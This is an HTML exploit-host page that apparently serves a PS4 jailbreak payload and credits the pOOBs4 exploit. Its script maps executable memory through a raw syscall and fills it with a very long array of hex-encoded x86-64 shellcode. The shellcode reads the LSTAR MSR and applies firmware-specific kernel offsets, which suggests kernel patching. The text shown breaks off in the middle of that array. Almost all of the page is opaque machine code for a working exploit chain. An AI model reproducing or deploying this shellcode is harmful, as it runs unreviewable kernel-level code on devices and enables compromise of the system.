<!DOCTYPE html><html>
<head>
<title>Payload</title>
<meta name=viewport content="width=device-width, initial-scale=1">
<style>body{color:white;font-size:20px;text-align:center;margin:0;overflow:hidden;}.info{overflow: hidden;position: fixed;position: absolute;top: 45%;left: 50%;font-size: 25px;font-family: sans-serif;color: #b8b8b8;transform: translate(-50%, -50%);}</style>
<script>

// original exploit: https://github.com/ChendoChap/pOOBs4

function showMessage(msg) {
  document.getElementById("message").innerHTML = msg;
  document.getElementById("message").style.display='block';
}

function injectPayload() //single payload inject for both conditions/removed need for binloader/netcat etc - stooged
{
	var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
	var payload=[0X00043ee9,0X41564100,0X55544155,0X48ed3153,0X0e60ec81,0X8d480000,0X00384705,0X00388300,0X014b840f,0X8d4c0000,0X003d532d,0X7d804100,0X840f0000,0X00000124,0X21058d48,0X3100003a,0X4810ffff,0X8948c289,0X058d48c3,0X00003810,0X48ea2948,0X39480063,0Xff8c0fc2,0X4c000000,0X38e2258d,0X8d480000,0X480a247c,0X2db5358d,0X26b90000,0X4c000000,0X5d24b48d,0Xf3000002,0X2484c7a4,0X00000230,0X00000000,0X24548d48,0X2484c70a,0X00000258,0X00000000,0X24bc8d48,0X0000065d,0X5c2484c6,0X01000002,0X000400be,0X2484c700,0X00000240,0Xffffffff,0Xff41c031,0X894c2414,0X158d48e9,0X00002d89,0X000400be,0Xf7894c00,0X8d48c031,0X4130246c,0X312414ff,0X7c8d48c0,0X7eb93824,0X48000000,0X302444c7,0X00000000,0X18158d48,0Xbe00002d,0X00000200,0X894cabf3,0Xef8948f1,0X2414ff41,0X59bfc931,0X41000002,0X8948c489,0Xbec031ea,0X00000007,0X002cb6e8,0X058d4800,0X0000373c,0Xff85388b,0X89440b78,0Xee8948e2,0X00278de8,0X058d4800,0X00003b7c,0X24b48d48,0X00000230,0X30bac931,0X3100000c,0Xdd8948ff,0X02eb10ff,0X8d48ed31,0X003afb05,0X0001bf00,0X10ff0000,0Xfffea5e9,0Xc48148ff,0X00000e60,0X5d5bc031,0X5d415c41,0X41c35e41,0X41564157,0X55544155,0Xec814853,0X00000f68,0X8948c031,0X00f7b9fd,0X8d480000,0X4839247c,0X379e1d8d,0X89490000,0X48aaf3f4,0X2c71358d,0X8d480000,0Xb90b247c,0X00000026,0X24bc8d4c,0X0000035d,0Xc748a4f3,0X00312444,0X48000000,0X5d24bc8d,0Xc7000007,0X03302484,0X00000000,0X00be0000,0Xc7000004,0X03582484,0X00000000,0X89490000,0X2484c6d5,0X0000035c,0X548d4801,0X84c70b24,0X00034024,0Xffffff00,0Xb48d4cff,0X00013024,0X4c13ff00,0X8948ff89,0X158d48e9,0X00002c25,0X000400be,0Xffc03100,0X48c03113,0X3824bc8d,0Xb9000001,0X0000007e,0X2484c748,0X00000130,0X00000000,0Xc0158d48,0Xbe00002b,0X00000200,0X894cabf3,0Xf7894cf9,0Xc93113ff,0X000259bf,0Xc7894100,0X31f2894c,0X0007bec0,0X60e80000,0X4800002b,0X35e6058d,0X388b0000,0X0b78ff85,0X4cfa8944,0X37e8f689,0X48000026,0X3a26058d,0X8d4c0000,0X48312474,0X3024b48d,0X31000003,0X0c30bac9,0Xff310000,0X894c10ff,0Xe2894ce9,0Xbef7894c,0X000000ff,0X13ffc031,0X48f6894c,0X68e8ef89,0X4800001d,0X0f68c481,0Xc0310000,0X5c415d5b,0X5e415d41,0X41c35f41,0X41564157,0X55544155,0Xec814853,0X00000f68,0X8948c031,0X00f7b9fd,0X8d480000,0X4839247c,0X363e1d8d,0X89490000,0X48aaf3f4,0X2b11358d,0X8d480000,0Xb90b247c,0X00000026,0X24bc8d4c,0X0000035d,0Xc748a4f3,0X00312444,0X48000000,0X5d24bc8d,0Xc7000007,0X03302484,0X00000000,0X00be0000,0Xc7000004,0X03582484,0X00000000,0X89490000,0X2484c6d5,0X0000035c,0X548d4801,0X84c70b24,0X00034024,0Xffffff00,0Xb48d4cff,0X00013024,0X4c13ff00,0X8948ff89,0X158d48e9,0X00002ac5,0X000400be,0Xffc03100,0X48c03113,0X3824bc8d,0Xb9000001,0X0000007e,0X2484c748,0X00000130,0X00000000,0X60158d48,0Xbe00002a,0X00000200,0X894cabf3,0Xf7894cf9,0Xc93113ff,0X000259bf,0Xc7894100,0X31f2894c,0X0007bec0,0X00e80000,0X4800002a,0X3486058d,0X388b0000,0X0b78ff85,0X4cfa8944,0Xd7e8f689,0X48000024,0X38c6058d,0X8d4c0000,0X48312474,0X3024b48d,0X31000003,0X0c30bac9,0Xff310000,0X894c10ff,0Xe2894ce9,0Xbef7894c,0X000000ff,0X13ffc031,0X48f6894c,0X32e8ef89,0X4800001b,0X0f68c481,0Xc0310000,0X5c415d5b,0X5e415d41,0X41c35f41,0X41564157,0X55544155,0Xec814853,0X000010a8,0Xb1058b66,0X48000029,0X2b247c8d,0X000005b9,0X2444c700,0X00000023,0X44c76600,0X00002724,0X247c8d4c,0X44896623,0Xc0312924,0X2444c748,0X0000003f,0X6c8d4800,0Xc7483024,0X00722444,0X4c000000,0X9d24a48d,0X48000004,0X712484c7,0X00000001,0X4c000000,0X9d24ac8d,0Xf3000008,0X7c8d48aa,0X05b94724,0Xf3000000,0X7c8d48aa,0Xf7b97a24,0Xf3000000,0Xbc8d48aa,0X00017924,0X00f7b900,0Xaaf30000,0X002555e8,0X1df9e800,0Xf0e80000,0X31000023,0X1383e8c0,0Xc0310000,0X0013b1e8,0X1665e800,0X894c0000,0X12b8e8ff,0Xd2310000,0Xb9ef8948,0X00000008,0X000008be,0X1d78e800,0X8d480000,0X0036f705,0X058d4c00,0X00002930,0Xd6158d48,0X31fffffa,0X48f631c9,0X8d48ef89,0X027024ac,0X10ff0000,0X011d8d48,0X48000034,0X4c247c8d,0Xd4358d48,0Xb9000028,0X00000026,0X24448d48,0Xc7a4f34c,0X04702484,0X00000000,0X89480000,0X2484c7c2,0X00000498,0X00000000,0X000400be,0X2484c600,0X0000049c,0Xef894c01,0X802484c7,0Xff000004,0X48ffffff,0X31240489,0X4c13ffc0,0X8d48e789,0X0028bb15,0X0400be00,0Xc0310000,0Xc03113ff,0X24bc8d48,0X00000278,0X00007eb9,0X84c74800,0X00027024,0X00000000,0X158d4800,0X00002843,0X000200be,0X4cabf300,0X8948e189,0X3113ffef,0X0259bfc9,0X89410000,0Xea8948c4,0X07bec031,0Xe8000000,0X000027e3,0X69058d48,0X8b000032,0X78ff8538,0Xe289440b,0Xe8ee8948,0X000022ba,0Xa9058d48,0X4c000036,0X7024b48d,0X31000004,0Xbaff31c9,0X00000c30,0X4cf6894c,0X3f24648d,0X8d4810ff,0X00330f1d,0X158d4800,0X00002836,0X392d8d48,0Xbe000037,0X00000200,0X8948c031,0X4813ffef,0X2924448d,0X48e6894c,0X8948c789,0Xe8102444,0X00001b0d,0Xf5058d48,0Xc6000031,0X48000045,0X72246c8d,0X48e1894c,0X280e158d,0Xffbe0000,0X48000000,0X00c7ef89,0X00000000,0X13ffc031,0X0001ffbe,0Xef894800,0X0012d7e8,0Xa48d4c00,0X00017124,0Xf8894d00,0X48e98948,0X27e1158d,0Xffbe0000,0X48000000,0Xc031ef89,0Xffbe13ff,0X48000001,0Xa9e8ef89,0X48000012,0X8d48e989,0X0027c415,0X00ffbe00,0X89480000,0Xffc031ef,0Xe7894c13,0X48e98948,0X27b6158d,0Xffbe0000,0X31000000,0X4c13ffc0,0X8d4ce789,0X049d24a4,0Xcde80000,0X41000012,0Xc085c089,0X24848d48,0X00000278,0X24448948,0Xd8840f08,0X48000000,0Xb9243c8b,0X00000026,0Xf4358d48,0Xf3000026,0X2484c7a4,0X00000470,0X00000000,0X24548d48,0X2484c74c,0X00000498,0X00000000,0X000400be,0X2484c600,0X0000049c,0Xef894c01,0X802484c7,0Xff000004,0X31ffffff,0X4c13ffc0,0X894ce789,0X158d48f9,0X00002739,0X000400be,0X48c03100,0X7024ac8d,0Xff000002,0X7c8b4813,0Xc0310824,0X00007eb9,0X84c74800,0X00027024,0X00000000,0X158d4800,0X00002667,0X000200be,0X4cabf300,0X8948e189,0X3113ffef,0X0259bfc9,0X89410000,0Xea8948c4,0X07bec031,0Xe8000000,0X00002607,0X8d058d48,0X8b000030,0X78ff8538,0Xe289440b,0Xe8ee8948,0X000020de,0X30bac931,0X4c00000c,0X6de9f689,0X48000002,0X8944ef89,0Xe81c2444,0X0000120e,0Xbeef8948,0X000001ff,0X001163e8,0X3c8b4800,0X0026b924,0X8d480000,0X00260235,0Xc7a4f300,0X04702484,0X00000000,0X8d480000,0Xc74c2454,0X04982484,0X00000000,0X00be0000,0Xc6000004,0X049c2484,0X4c010000,0X84c7ef89,0X00048024,0Xffffff00,0Xffc031ff,0X4c8b4813,0X8d481024,0X00267815,0X0400be00,0X894c0000,0Xffc031e7,0X448b4413,0X7eb91c24,0X48000000,0X08247c8b,0X2484c748,0X00000270,0X00000000,0X24ac8d48,0X00000270,0X70158d48,0Xbe000025,0X00000200,0Xf3c08944,0Xe1894cab,0X31ef8948,0X3113ffc0,0X0259bfc9,0X89410000,0Xea8948c7,0X07bec031,0Xe8000000,0X0000250b,0X91058d48,0X8b00002f,0X78ff8538,0Xfa89440b,0Xe8ee8948,0X00001fe2,0Xd1058d48,0X4c000033,0X8d4cf689,0X31722474,0Xbaff31c9,0X00000c30,0X24ac8d48,0X00000270,0X894c10ff,0X358d48f2,0X00002606,0X013d8d48,0Xe8000026,0Xfffff863,0X48f2894c,0X25fa358d,0X8d480000,0X0025f53d,0Xf84de800,0X894cffff,0X358d48f2,0X000025f1,0Xec3d8d48,0Xe8000025,0Xfffff837,0X48f2894c,0X25e5358d,0X8d480000,0X0025e03d,0Xf981e800,0X894cffff,0X358d48f2,0X000025e3,0Xde3d8d48,0Xe8000025,0Xfffff96b,0X48f2894c,0X25dd358d,0X8d480000,0X0025d83d,0Xf955e800,0X8d48ffff,0X017124bc,0X5ce80000,0X48000010,0Xb9243c8b,0X00000026,0X7c358d48,0Xf3000024,0X2484c7a4,0X00000470,0X00000000,0X24548d48,0X2484c74c,0X00000498,0X00000000,0X000400be,0X2484c600,0X0000049c,0Xef894c01,0X802484c7,0Xff000004,0X31ffffff,0X4c13ffc0,0X8d48e789,0X00258515,0X0400be00,0Xc0310000,0X8b4813ff,0X3108247c,0X007eb9c0,0Xc7480000,0X02702484,0X00000000,0X8d480000,0X0023fa15,0X0200be00,0Xabf30000,0X48e1894c,0X13ffef89,0X59bfc931,0X41000002,0X8948c489,0Xbec031ea,0X00000007,0X00239ae8,0X058d4800,0X00002e20,0Xff85388b,0X89440b78,0Xee8948e2,0X001e71e8,0Xb48d4800,0X00047024,0Xbac93100,0X00000c30,0X51058d48,0X31000032,0X4810ffff,0X10a8c481,0Xc0310000,0X5c415d5b,0X5e415d41,0X48c35f41,0X4908478b,0X8b4cf189,0X8b484840,0X8b494070,0X8b660841,0X2b3d6600,0Xac840f02,0X0f000003,0X00010887,0Xda3d6600,0Xb4870f01,0X66000000,0X7701d53d,0X973d664e,0X8b870f01,0X66000000,0X77018f3d,0X633d6664,0X01840f01,0X66000002,0X0f01723d,0X00021784,0X5e3d6600,0X7c850f01,0Xb9000004,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X00b53f30,0X15300548,0Xd6e9015c,0X66000004,0X6601d72d,0X0f03f883,0X00029f87,0X158d4800,0X00002488,0X48c0b70f,0Xb9820463,0Xc0000082,0Xffd00148,0X902d66e0,0Xf8836601,0X28870f07,0X48000004,0X2472158d,0Xb70f0000,0X046348c0,0Xd0014882,0X3d66e0ff,0X840f01c2,0X0000023c,0X01c73d66,0X0232840f,0Xfce90000,0X66000003,0X7701fb3d,0Xf33d662b,0Xec860f01,0X66000003,0X6601f42d,0X0f07f883,0X0003de87,0X158d4800,0X00002448,0X48c0b70f,0X48820463,0Xe0ffd001,0X02263d66,0X028d840f,0X3d660000,0X840f0229,0X00000283,0X0003b2e9,0Xbd3d6600,0X2b840f02,0X77000003,0X8b3d667e,0Xe8840f02,0X77000002,0X5a3d663e,0X9c840f02,0X77000002,0X2c3d6619,0X70840f02,0X66000002,0X0f02583d,0X00028684,0X0375e900,0X3d660000,0X840f026c,0X00000297,0X028a3d66,0X02ad840f,0X5ce90000,0X66000003,0X0f02a03d,0X0002b584,0X66197700,0X0f029e3d,0X0002a984,0X9f3d6600,0X9f840f02,0Xe9000002,0X00000337,0X02bc3d66,0X02b0840f,0X28e90000,0X66000003,0X0f03213d,0X0002e184,0X663e7700,0X0f02ef3d,0X0002b584,0X66197700,0X0f02be3d,0X00028984,0Xee3d6600,0X9f840f02,0Xe9000002,0X000002f7,0X02f33d66,0X0290840f,0X3d660000,0X840f0320,0X000002a6,0X0002dee9,0X543d6600,0Xb7840f03,0X77000002,0X233d6619,0X8b840f03,0X66000002,0X0f03523d,0X0002a184,0X02b9e900,0X3d660000,0X850f0384,0X000002af,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0X11f6b088,0X60054801,0Xe9021efd,0X00000309,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0Xb53af088,0X30054800,0Xe9015c11,0X000002e9,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0Xb5cf1088,0X40054800,0Xe9015cd0,0X000002c9,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0Xc1761088,0X50054800,0Xe901d5e8,0X000002a9,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0Xc174e088,0X20054800,0Xe901d5e7,0X00000289,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0Xc174d088,0X10054800,0Xe901d5e7,0X00000269,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0Xc1b4d088,0X10054800,0Xe901d627,0X00000249,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0Xd303e088,0X60054800,0Xe901ea64,0X00000229,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0Xd3727088,0Xa0054800,0Xe901ead1,0X00000209,0Xc148320f,0X094820e2,0X888d48d0,0X00d372e0,0Xd2100548,0Xeee901ea,0Xb9000001,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X010984e0,0X18300548,0Xcee9022c,0Xb9000001,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X010984e0,0X18b00548,0Xaee9022c,0Xb9000001,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X01133fc0,0Xf3b00548,0X8ee9022e,0Xb9000001,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X01138fc0,0X33b00548,0X6ee9022f,0Xb9000001,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X01139298,0Xf9000548,0X4ee9021b,0Xb9000001,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X0113d298,0X39000548,0X2ee9021c,0Xb9000001,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X0113d338,0X82b915eb,0X0fc00000,0Xe2c14832,0Xd0094820,0X58888d48,0X480113e3,0X30016005,0X00f7e902,0X82b90000,0X0fc00000,0Xe2c14832,0Xd0094820,0Xd8888d48,0X480113e1,0X2c559005,0X00d7e902,0X82b90000,0X0fc00000,0Xe2c14832,0Xd0094820,0X68888d48,0X480113b5,0Xb4622005,0X00b7e901,0X82b90000,0X0fc00000,0Xe2c14832,0Xd0094820,0X10888d48,0X480111a6,0Xb8c57005,0X0097e901,0X82b90000,0X0fc00000,0Xe2c14832,0Xd0094820,0X30888d48,0X480111a7,0Xc65f9005,0X417aeb01,0X81485554,0X000208ec,0X48c03100,0X08247c8d,0X00007eb9,0X48abf300,0X29c20d8d,0X89480000,0X04c748e5,0X00000024,0X158d4800,0X00001ffb,0X000200be,0Xef894800,0Xc93111ff,0X000259bf,0Xc4894100,0X31ea8948,0X0007bec0,0X20e80000,0X4800001e,0X28a6058d,0X388b0000,0X0b78ff85,0X48e28944,0Xf7e8ee89,0X48000018,0X0208c481,0Xc8830000,0X5c415dff,0X968b48c3,0X00000118,0X0446c748,0X00000000,0X001446c7,0Xc7000000,0X00000002,0X118b4800,0X30568948,0X0013be48,0X00000000,0X8b483801,0X40894900,0X40894920,0X878b4818,0X00000130,0X6040c748,0Xffffffff,0X58708948,0X6840c748,0Xffffffff,0X48c3c031,0X6608468b,0X3d66008b,0X840f022b,0X000003bb,0X0131870f,0X3d660000,0X870f01da,0X000000bb,0X01d53d66,0X3d665577,0X870f0197,0X00000092,0X018f3d66,0X3d666b77,0X840f0163,0X00000231,0X01723d66,0X024e840f,0X3d660000,0X850f015e,0X000004c1,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0Xff3120b0,0X888d48ff,0Xffff3130,0X6b7b2d48,0X14e90005,0X66000005,0X6601d72d,0X0f03f883,0X00028487,0X158d4800,0X00001f30,0X48c0b70f,0Xb9820463,0Xc0000082,0Xffd00148,0X902d66e0,0Xf8836601,0X66870f07,0X48000004,0X1f1a158d,0Xb70f0000,0X046348c0,0Xd0014882,0X3d66e0ff,0X840f01c2,0X0000021a,0X01c73d66,0X0210840f,0X3ae90000,0X66000004,0X7701fb3d,0Xf33d662b,0X2a860f01,0X66000004,0X6601f42d,0X0f07f883,0X00041c87,0X158d4800,0X00001ef0,0X48c0b70f,0X48820463,0Xe0ffd001,0X02263d66,0X028e840f,0X3d660000,0X850f0229,0X000003f5,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0X1b46d0b0,0X888d4800,0X001b46e0,0X3cfd0548,0X48e9003c,0X66000004,0X0f02bd3d,0X00032b84,0X667e7700,0X0f028b3d,0X0002da84,0X663e7700,0X0f025a3d,0X00028984,0X66197700,0X0f022c3d,0X00025684,0X583d6600,0X73840f02,0Xe9000002,0X00000391,0X026c3d66,0X0282840f,0X3d660000,0X840f028a,0X0000029f,0X000378e9,0Xa03d6600,0Xae840f02,0X77000002,0X9e3d6619,0Xa2840f02,0X66000002,0X0f029f3d,0X00029884,0X0353e900,0X3d660000,0X840f02bc,0X000002b0,0X000344e9,0X213d6600,0Xef840f03,0X77000002,0Xef3d663e,0Xbc840f02,0X77000002,0Xbe3d6619,0X89840f02,0X66000002,0X0f02ee3d,0X0002a684,0X0313e900,0X3d660000,0X840f02f3,0X00000297,0X03203d66,0X02b4840f,0Xfae90000,0X66000002,0X0f03543d,0X0002cc84,0X66197700,0X0f03233d,0X00029984,0X523d6600,0Xb6840f03,0Xe9000002,0X000002d5,0X03843d66,0X02cb850f,0X82b90000,0X0fc00000,0Xe2c14832,0Xd0094820,0Xd0b08d48,0X480008ba,0Xbaf0888d,0X05480008,0X00167e91,0X00031ee9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0X3110b08d,0X8d48ffff,0Xff312088,0X8b2d48ff,0Xe900056b,0X000002f7,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0Xff30f0b0,0X888d48ff,0Xffff3100,0X6bab2d48,0Xd0e90005,0Xb9000002,0Xc0000082,0Xc148320f,0X094820e2,0Xb08d48d0,0X00051ac0,0Xd0888d48,0X4800051a,0X01030705,0X02a9e900,0X82b90000,0X0fc00000,0Xe2c14832,0Xd0094820,0Xe0b08d48,0X48ffe60f,0X0ff0888d,0X2d48ffe6,0X001c59e9,0X000282e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0Xdfd0b08d,0X8d48ffe5,0Xe5dfe088,0Xc92d48ff,0Xe9001c85,0X0000025b,0Xc148320f,0X094820e2,0Xb08d48d0,0Xffe5e040,0X50888d48,0X48ffe5e0,0X1c85592d,0X0239e900,0X82b90000,0X0fc00000,0Xe2c14832,0Xd0094820,0Xf0b08d48,0X48000115,0X1600888d,0X05480001,0X0013ed6f,0X000212e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0X15f0b08d,0X8d480001,0X01160088,0X7f054800,0Xe90013ee,0X000001eb,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0X1b47d0b0,0X888d4800,0X001b47e0,0X3dfd0548,0Xc4e9003c,0Xb9000001,0Xc0000082,0Xc148320f,0X094820e2,0Xb08d48d0,0X001b4a40,0X50888d48,0X48001b4a,0X3c40bd05,0X019de900,0X82b90000,0X0fc00000,0Xe2c14832,0Xd0094820,0Xd0b08d48,0X48004592,0X92e0888d,0X1ceb0045,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0X4592f0b0,0X888d4800,0X00459300,0X1ee70548,0X58e90024,0Xb9000001,0Xc0000082,0Xc148320f,0X094820e2,0Xb08d48d0,0X002336d0,0Xe0888d48,0Xeb002336,0X0082b91c,0X320fc000,0X20e2c148,0X48d00948,0X3a80b08d,0X8d480023,0X233a9088,0X24054800,0Xe9000ad1,0X00000113,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0X1cb730b0,0X888d4800,0X001cb750,0X3efb0548,0Xece9001d,0Xb9000000,0Xc0000082,0Xc148320f,0X094820e2,0Xb08d48d0,0X00364b80,0Xa0888d48,0X4800364b,0X0dcd1105,0X00c5e900,0X82b90000,0X0fc00000,0Xe2c14832,0Xd0094820,0Xc0b08d48,0X48001d55,0X55e0888d,0X0548001d,0X000feba1,0X00009ee9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0X3490b08d,0X8d480029,0X2934b088,0X51054800,0Xeb000842,0X5554417a,0X08ec8148,0X31000002,0X7c8d48c0,0X7eb90824,0Xf3000000,0X0d8d48ab,0X000023dc,0X48e58948,0X002404c7,0X48000000,0X1a15158d,0X00be0000,0X48000002,0X11ffef89,0X59bfc931,0X41000002,0X8948c489,0Xbec031ea,0X00000007,0X00183ae8,0X058d4800,0X000022c0,0Xff85388b,0X89440b78,0Xee8948e2,0X001311e8,0Xc4814800,0X00000208,0X5dffc883,0X0fc35c41,0X8948c220,0Xe78148d7,0Xfffeffff,0Xc7c7220f,0X0001b806,0X46c76600,0Xc7c30004,0X0001b801,0X41c76600,0Xc7c30004,0Xebc03100,0Xc2220f01,0X48c3c031,0X1a463d8d,0Xffba0000,0Xbe000001,0X00000001,0X02d6e851,0Xc7890000,0Xff85c031,0Xd5e81678,0X48000002,0X1a223d8d,0Xd5e80000,0Xb8000002,0X00000001,0X5541c35a,0X53555441,0Xd8ec8148,0X48000000,0X222a1d8d,0X8b660000,0Xc0856603,0X015e850f,0X8d4c0000,0X0022ef25,0X6c8d4800,0X8d482f24,0X0026f315,0X2c8b4d00,0X4812ff24,0X8d48ef89,0X0019e415,0Xc1894800,0X000021be,0X41c03100,0Xd231d5ff,0X8948f631,0X025ae8ef,0Xc0850000,0X1e79c589,0Xf631d231,0Xd33d8d48,0Xe8000019,0X00000244,0Xc589c085,0Xc8830879,0X00fee9ff,0Xd2310000,0Xef89f631,0X000303e8,0X748d4800,0X20ba0824,0X89000000,0X0202e8ef,0X83480000,0Xd67520f8,0X2474b70f,0X89d23120,0Xc6ff48ef,0X05e6c148,0Xe8f58949,0X000002d4,0X24748d48,0X0040ba50,0Xef890000,0X0001d3e8,0Xf8834800,0X0fa77540,0X862484b7,0X0f000000,0X8824b4b7,0X0f000000,0Xb70ff0af,0X00842484,0X63480000,0Xee014cf6,0X40c60148,0X740fc6f6,0Xc6ff4805,0Xd231f5eb,0X85e8ef89,0X48000002,0X9024b48d,0Xba000000,0X00000040,0X81e8ef89,0X48000001,0X0f40f883,0Xffff5185,0X48ef89ff,0X03246c8d,0X00018fe8,0X8c8b4800,0X0000a824,0X2444c700,0X00000003,0X2444c600,0X8d480007,0X00190e15,0X0005be00,0X89480000,0X49c031ef,0Xc148c889,0Xc14928e9,0Xb60f20e8,0Xb60f45c9,0X14ff41c0,0X058d4824,0X00002308,0Xffef8948,0X03896610,0Xd8c48148,0X5b000000,0X415c415d,0X5355c35d,0X18ec8348,0X8948c031,0Xe808247c,0Xfffffe62,0Xb12d8d48,0X48000022,0X1984358d,0Xb70f0000,0X7c8b48d0,0Xd3890824,0X55ffc031,0Xfb836600,0X7c8b4809,0X11770824,0X4817be0f,0X1898358d,0Xc0310000,0Xeb0055ff,0Xfb836663,0X0f157763,0X48014fbe,0X1886358d,0Xbe0f0000,0Xffc03117,0X48eb0055,0Xe7fb8166,0X0f1a7703,0X48014fbe,0X1873358d,0Xbe0f0000,0X44c03117,0X0247be0f,0Xeb0055ff,0Xffc88327,0X0ffb8166,0X0f1f7727,0X48014fbe,0X184d358d,0Xbe0f0000,0X44c03117,0X034fbe0f,0X47be0f44,0X0055ff02,0X8348c031,0X5d5b18c4,0Xec8348c3,0Xe8c03118,0Xfffffd7b,0X31c08941,0Xc08545c0,0Xa3e81b75,0X48fffffd,0Xf1f13d8d,0X8d48ffff,0X660e2474,0X0e244489,0X001185e8,0Xc4834800,0X8348c318,0Xc03118ec,0Xfffd7de8,0X3d8d48ff,0Xfffff77b,0X24748d48,0X4489660e,0X5fe80e24,0X48000011,0Xc318c483,0X03c0c748,0Xe9000000,0X00001502,0X04c0c748,0Xe9000000,0X000014f6,0X05c0c748,0Xe9000000,0X000014ea,0X06c0c748,0Xe9000000,0X000014de,0X0ac0c748,0Xe9000000,0X000014d2,0X09c0c748,0Xe9000000,0X000014c6,0X3ac0c748,0Xe9000000,0X000014ba,0X39c0c748,0Xe9000000,0X000014ae,0X15c0c748,0Xe9000000,0X000014a2,0X7ac0c748,0Xe9000001,0X00001496,0X16c0c748,0Xe9000000,0X0000148a,0X7bc0c748,0Xe9000000,0X0000147e,0X7cc0c748,0Xe9000000,0X00001472,0X80c0c748,0Xe9000000,0X00001466,0X88c0c748,0Xe9000000,0X0000145a,0X89c0c748,0Xe9000000,0X0000144e,0Xbcc0c748,0Xe9000000,0X00001442,0Xbdc0c748,0Xe9000000,0X00001436,0Xbec0c748,0Xe9000000,0X0000142a,0X10c0c748,0Xe9000001,0X0000141e,0Xdec0c748,0Xe9000001,0X00001412,0Xedc0c748,0Xe9000001,0X00001406,0Xf631d231,0Xff06e851,0Xc789ffff,0Xff83c031,0Xe80a74ff,0Xffffff04,0X000001b8,0Xbac35a00,0X000001ff,0X000601be,0Xe1e85100,0X83fffffe,0X0874fff8,0Xe9c7895a,0Xfffffee0,0X5741c358,0X55415641,0X53555441,0X88ec8148,0X48000000,0X203a058d,0X89480000,0Xcc8341fd,0X4810ffff,0X8949c085,0X0b840fc5,0X48000001,0X1eee058d,0X894c0000,0X4810ffef,0X840fc085,0X000000c3,0X111d8d48,0X4c000020,0X4808608d,0X1424358d,0X894c0000,0X8513ffe7,0X48d074c0,0X1413358d,0X894c0000,0X8513ffe7,0X48c074c0,0X20361d8d,0X89480000,0X4c13ffef,0X8949e789,0X4d13ffc6,0X02067c8d,0X7d058d48,0X4c00001e,0X10ffff89,0X49c08548,0X7074c689,0X410d8d4c,0X4d00001e,0X8948e089,0Xe98948c7,0Xd0158d48,0X4c000013,0Xc031fe89,0X4811ff41,0X0824748d,0Xe8f7894c,0Xfffffeb4,0Xffcc8341,0X2075c085,0X1024448b,0X66f7894c,0X66f00025,0X7540003d,0Xff1ce807,0X05ebffff,0Xfffdffe8,0Xc48941ff,0Xd5058d48,0X4c00001f,0X10fff789,0X0fe48545,0Xffff2a84,0X4509ebff,0X04ebe431,0Xffcc8341,0Xa5058d48,0X4c00001f,0X10ffef89,0X75e48545,0Xc4814819,0X00000088,0X5bef8948,0X415c415d,0X415e415d,0Xfe36e95f,0X8148ffff,0X000088c4,0Xe0894400,0X5c415d5b,0X5e415d41,0X53c35f41,0X5d1d8d48,0X8300001d,0X3375003b,0X69058d48,0X31000021,0X48f631d2,0X152f3d8d,0X31450000,0Xc03145c9,0X10ffc931,0Xed158d48,0X4800001c,0X153d358d,0Xc7890000,0Xf5e80389,0X4800000c,0X1cfe1d8d,0X3b830000,0X48347500,0X212a058d,0Xd2310000,0X8d48f631,0X00153f3d,0Xc9314500,0X31c03145,0X4810ffc9,0X1cc6158d,0X8d480000,0X00155335,0X5b038900,0Xb5e9c789,0X5b00000c,0X555441c3,0X98ec8148,0X31000000,0X48f631d2,0X08247c89,0Xfffcebe8,0Xe43145ff,0X74fff883,0X7c8b487e,0Xc5890824,0X24748d48,0Xfd7ae818,0Xff31ffff,0X41c93145,0X02b9e889,0Xba000000,0X00000003,0X004000be,0X0600e800,0X83480000,0X8948fff8,0X484174c7,0X60244c8b,0X03f98348,0X38812c7e,0X1d3d154f,0Xb70f2475,0Xc0ff1840,0X8d05e0c1,0X63480450,0Xd13948d2,0X9848107c,0X81e43145,0X457f073c,0X0f41464c,0X00bec494,0Xe8000040,0X000005c2,0X71e8ef89,0X48fffffc,0X0098c481,0X89440000,0X5c415de0,0Xe6c148c3,0X48574120,0X5641d609,0X89415541,0X4d5441fe,0X4855c589,0X4853f589,0X5141cb89,0X74db8548,0Xfb81485c,0X00100000,0X0000bc41,0X0f4c0010,0X8949e346,0X45ff31e9,0X02b9f089,0Xba000800,0X00000001,0Xe8e6894c,0X00000552,0Xfff88348,0X74c78949,0Xc689482f,0X15058d48,0X4c00001c,0X894cef89,0Xe5014de2,0X4ce3294c,0X10ffe501,0X4ce6894c,0X2fe8ff89,0Xeb000005,0X0001b89f,0X02eb0000,0X5b5ac031,0X415c415d,0X415e415d,0X8941c35f,0Xc88941f1,0X08c28348,0X3944c031,0X442e7dc0,0X2174c839,0X184a8b48,0X74c98548,0X778b4818,0X128b4c08,0X72d6394c,0X7703480c,0Xd1014c20,0X76ce3948,0X48c0ff0b,0Xeb38c283,0Xc3c031cd,0X000001b8,0X5741c300,0X55415641,0X53555441,0X18ec8348,0X48fc8949,0X1b9a058d,0X63480000,0Xfd8948fe,0X28ff6b48,0Xffd58949,0Xc0854810,0X0fc68949,0X00008984,0Xe3894c00,0X45ff3145,0X3941c031,0X48777def,0X00207b83,